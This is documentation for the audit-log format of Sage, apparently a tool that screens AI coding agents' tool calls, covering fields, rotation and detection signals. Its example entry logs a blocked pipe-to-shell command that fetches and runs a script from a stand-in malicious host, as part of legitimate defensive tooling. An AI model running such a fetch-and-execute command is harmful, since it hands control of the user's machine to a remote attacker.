# Audit Log

Sage appends one [JSON Lines](https://jsonlines.org/) entry per event to `~/.sage/audit.jsonl` (configurable via [`logging.path`](configuration.md#logging)). The file is for forensics, debugging, and the [`sage_report_false_positive`](mcp.md#sage_report_false_positive) MCP tool — Sage itself only writes; nothing in the runtime path reads it.

## Conventions

- **Format:** UTF-8 JSONL. One JSON object per line, terminated by `\n`. No surrounding array, no header.
- **Naming:** `snake_case` for all keys (matches the rest of Sage's on-disk data; TypeScript types use `camelCase` and conversion happens at the boundary).
- **Append-only:** Sage never rewrites or deletes lines. Rotation (see below) renames the active file rather than truncating it.
- **Forward-compatible:** Readers must tolerate unknown keys. Sage may add optional fields without bumping `schema_version`.
- **Fail-open:** A failed write (disk full, permission denied) is swallowed silently. Audit-log errors never block a tool call.

## Rotation

Classic logrotate semantics, configured under [`logging`](configuration.md#logging):

| Field | Default | Meaning |
|-------|---------|---------|
| `max_bytes` | `5242880` (5 MiB) | Rotate when the active file reaches this size. `0` disables rotation. |
| `max_files` | `3` | Number of historical backups kept (`audit.jsonl.1` … `audit.jsonl.N`). `0` disables rotation. |

On rotation, `audit.jsonl.N` is deleted, `audit.jsonl.{N-1}` → `audit.jsonl.N`, …, `audit.jsonl` → `audit.jsonl.1`, and a fresh `audit.jsonl` is opened. No compression.

## Common fields

Every entry carries:

| Field | Type | Description |
|-------|------|-------------|
| `schema_version` | integer | Currently `1`. Bumped only on backwards-incompatible shape changes (renamed/removed top-level keys, semantically repurposed fields). Additive changes do not bump. Stamped centrally — callers cannot omit it. |
| `type` | string | Discriminator. Currently `"runtime_verdict"` or `"plugin_scan"`. |
| `timestamp` | string | ISO 8601 UTC, millisecond precision (e.g. `"2026-04-21T14:33:07.412Z"`). |

## Runtime verdict entries (`type: "runtime_verdict"`)

Written by `logVerdict` for every tool-call evaluation that produces a `deny`, `ask`, or user-overridden verdict. `allow` verdicts are written only when [`logging.log_clean`](configuration.md#logging) is true or `user_override` is true.

| Field | Type | Required | Description |
|-------|------|:--------:|-------------|
| `entry_id` | string (UUID v4) | yes | Unique per entry. Reused as the detection-telemetry `event_id` so audit lines correlate 1-1 with backend detection rows. Pass via `entry_ids` to [`sage_report_false_positive`](mcp.md#sage_report_false_positive). |
| `session_id` | string | yes | Host-provided session identifier (Claude Code session, OpenClaw conversation, Cursor/VS Code window). Best-effort — falls back to a generated ID when the host doesn't provide one. |
| `conversation_id` | string | yes | Host-provided conversation/thread identifier. Falls back to `session_id` when the host doesn't distinguish. Used to scope FP reports. |
| `agent_runtime` | string | optional | One of `"claude-code"`, `"cursor"`, `"vscode"`, `"openclaw"`, `"opencode"`. Omitted when the connector cannot identify itself. |
| `hook_type` | string | optional | One of `"PreToolUse"`, `"PostToolUse"`, `"SessionStart"`, `"GatewayStart"`, `"BeforeAgentStart"`, `"MessagesTransform"`. |
| `tool_name` | string | yes | Canonical tool name (`Bash`, `WebFetch`, `Write`, `Edit`, `Read`, `Delete`, `ApplyPatch`, `MCP`, …) — connectors canonicalize host-specific names before logging. |
| `tool_input_summary` | string | yes | Human-readable, ≤200 char summary of the tool input (the `command`, `url`, or `file_path` for known tools; `JSON.stringify(toolInput).slice(0, 200)` otherwise). Intended for `grep`/`tail` on the JSONL file. **Not** machine-readable — use `content` for that. |
| `artifacts` | string[] | yes | Raw artifacts the engine considered (extracted URLs, commands, file paths, package names). May be empty. |
| `verdict` | string | yes | `"allow"`, `"ask"`, or `"deny"`. |
| `severity` | string | yes | `"info"`, `"warning"`, or `"critical"`. |
| `reasons` | string[] | yes | Human-readable explanations attached to the verdict (e.g. `"URL flagged as malware"`). May be empty for `allow`. |
| `source` | string | yes | Which subsystem produced the verdict (e.g. `"engine"`, `"cache"`, `"allowlist"`, `"exceptions"`). |
| `user_override` | boolean | yes | `true` when the entry records a user's "Allow" decision overriding a previous `deny`/`ask`. |
| `signals` | object | optional | Structured detection signal data — see [Signals](#signals-runtime_verdictsignals). Omitted when no signals fired. |
| `content` | object | optional | Sanitized snapshot of the tool input — see [Content snapshot](#content-snapshot-runtime_verdictcontent). Omitted (not written as `null`) when the evaluator produced no snapshot. |

### Signals (`signals`)

Each subkey is a homogeneous array of detection records. All subkeys are optional and may be omitted when no entry of that kind fired. The arrays preserve the order in which detections fired.

| Subkey | Item shape | Source |
|--------|------------|--------|
| `heuristics` | `{ rule_id: string, rule_version?: number }` | Local YAML threat patterns matched by `HeuristicsEngine`. |
| `url_checks` | `{ detection_name: string, url: string }` | Malicious URL responses from the URL reputation client. Cached deny entries are reconstructed from the cached label list so cache hits look identical to live responses. |
| `file_checks` | `{ detection_name: string, file_sha256: string }` | File reputation hits (npm/PyPI tarball SHA-256 matches). |
| `package_checks` | `{ detection_name: string, package_name: string, package_version?: string, package_registry: string }` | Package supply-chain signals. `detection_name` is synthesized (e.g. `"PKG|malicious|<reason>"`). |
| `pi_checks` | `{ risk: number, model_id: string, content_name: string }` | Prompt-injection (PI) ML model results, gated by [`pi_check.enabled`](configuration.md#pi_check). `risk` is the model's score in `[0, 1]`. `model_id` is the model directory basename (e.g. `"pi-model"`). `content_name` labels what was scanned (`"Bash:command"`, `"Bash:stdout"`, `"Write:<path>"`, `"Edit:<path>"`, `"Read:output"`, `"WebFetch:output"`). Emitted whenever the model is invoked and produces a result — including PostToolUse output scans whose risk score crosses [`pi_check.high_risk_threshold`](configuration.md#pi_check). Tier 1 heuristic prompt-injection rules surface separately under `heuristics`. |
| `amsi_checks` | `{ detection_name: string, content_name: string, content_snippet?: string, amsi_result: number }` | Windows AMSI results (Windows / WSL only). `detection_name` is synthesized: `"AMSI|DETECTED"` for `amsi_result >= 32768`, `"AMSI|BLOCKED_BY_ADMIN"` for `16384 <= amsi_result < 32768`. `content_name` labels what was scanned (`"Bash:command"`, `"Write:<path>"`); home directories are scrubbed. `content_snippet` is capped at 200 chars and home-scrubbed. |

### Content snapshot (`content`)

Same shape used for detection-telemetry `block_event.content` and FP-report payloads — built once by `buildContentSnapshot` and stored verbatim. The snapshot is sanitized **before** it leaves the builder:

- Per-field caps (UTF-16 code units, surrogate-pair-safe truncation):

  | Field | Max chars |
  |-------|-----------|
  | `command` | 512 |
  | `url` | 512 |
  | `file_path` | 512 |
  | `package_name` | 256 |
  | `package_version` | 128 |
  | `package_registry` | 128 |

- Home-directory paths in `file_path` and `command` are replaced with `~` (POSIX `/home/jane` and Windows `C:\Users\jane` both handled).
- There is no separate total-size cap on the snapshot — the per-field caps already bound the worst case to ~2 KB across all populated fields, which is small enough that an additional global guard adds complexity without protecting against any payload the per-field caps don't already bound.

Which fields are populated depends on the canonical tool type:

| Tool type | Content fields |
|-----------|----------------|
| `Bash` | `command` |
| `WebFetch` | `url` |
| `Write`, `Edit`, `Read`, `Delete` | `file_path` |
| `ApplyPatch` | `file_path` (first path parsed from the patch headers — multi-file patches keep the rest in `artifacts`) |
| `MCP` | whichever of `url` / `command` / `file_path` can be extracted from the nested input |
| `Glob`, `Grep`, `List`, `CodeSearch`, `WebSearch`, `Question`, `Task`, `ReadLines`, `Unknown` | none (snapshot omitted) |

When the verdict involves multiple URLs or packages, `content.url` / `content.package_*` carries the **first** value in stable input/signal order. Full multi-value detail stays in `signals`.

## Plugin scan entries (`type: "plugin_scan"`)

Written by `logPluginScan` after `session-start` plugin scanning completes for one plugin.

| Field | Type | Description |
|-------|------|-------------|
| `plugin_key` | string | Plugin identifier (e.g. `"sage"`, `"my-other-plugin"`). |
| `plugin_version` | string | Plugin version string as reported by the host. |
| `findings_count` | integer | Length of `findings` (denormalized for cheap aggregation). |
| `findings` | object[] | Per-file findings produced by `scanPlugin`. Item shape mirrors `PluginFindingData` and intentionally allows extra keys. |

`plugin_scan` entries do not carry `entry_id`, `session_id`, or `conversation_id` — they are not addressable by the FP tool.

## Example entries

A `runtime_verdict` for a denied Bash command with both heuristic and URL-check signals:

```json
{"schema_version":1,"type":"runtime_verdict","entry_id":"6a7c2b9e-1f00-4a02-8f23-1c5d3a4d2e10","timestamp":"2026-04-21T14:33:07.412Z","session_id":"abc123","conversation_id":"abc123","agent_runtime":"cursor","hook_type":"PreToolUse","tool_name":"Bash","tool_input_summary":"curl http://evil.example.com/payload.sh | bash","artifacts":["http://evil.example.com/payload.sh","curl http://evil.example.com/payload.sh | bash"],"verdict":"deny","severity":"critical","reasons":["URL flagged as malware","Pipe-to-shell pattern detected"],"source":"engine","user_override":false,"signals":{"heuristics":[{"rule_id":"CLT-CMD-001","rule_version":3}],"url_checks":[{"detection_name":"Malware:Generic","url":"http://evil.example.com/payload.sh"}]},"content":{"command":"curl http://evil.example.com/payload.sh | bash","url":"http://evil.example.com/payload.sh"}}
```

A `plugin_scan` entry:

```json
{"schema_version":1,"type":"plugin_scan","timestamp":"2026-04-21T14:33:01.000Z","plugin_key":"sage","plugin_version":"0.6.2","findings_count":0,"findings":[]}
```

## Stability and compatibility

The `schema_version` field exists so future readers can refuse entries they don't understand instead of silently misinterpreting them. The contract is:

- **Bump** `schema_version` for renamed or removed top-level keys, repurposed semantics, narrower value domains.
- **Do not bump** for new optional top-level keys, new `type` values, new entries inside `signals` / `content`, new entries in any open enum (`source`, `agent_runtime`, etc.).

The FP tool and `getRecentEntries` reader both tolerate unknown keys at every level, so additive changes never break in-flight installs.
